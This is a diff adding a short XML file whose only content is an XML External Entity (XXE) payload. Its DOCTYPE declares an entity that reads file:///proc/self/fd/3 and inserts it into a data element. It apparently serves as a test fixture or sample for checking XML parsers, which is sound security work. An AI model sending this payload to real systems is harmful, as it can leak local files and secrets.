@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///proc/self/fd/3">
+]>
+<root>
+<data>&xxe;</data>
+</root>
